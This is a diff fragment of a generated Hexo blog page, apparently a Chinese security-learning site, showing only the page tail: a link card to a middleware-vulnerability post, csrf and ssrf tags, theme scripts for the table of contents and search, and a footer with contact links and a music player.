+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-02
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                    漏洞
+                                </a>
+                            
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E/%E7%BB%95%E8%BF%87/" class="post-category">
+                                    绕过
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/csrf/">
+                        <span class="chip bg-color">csrf</span>
+                    </a>
+                    
+                    <a href="/tags/ssrf/">
+                        <span class="chip bg-color">ssrf</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/12/09/day36/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="常见的中间件">
+                        
+                        <span class="card-title">常见的中间件</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            中间件漏洞
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-09
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                    漏洞
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/">
+                        <span class="chip bg-color">中间件</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2021-2023</span>
+            
+            <a href="/about" target="_blank">晓莎K</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/0x00xiaoshaK" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">219.7k</span>
+            
+            
+            
+            
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/0x00xiaoshaK" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1003682630@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1003682630" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1003682630" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
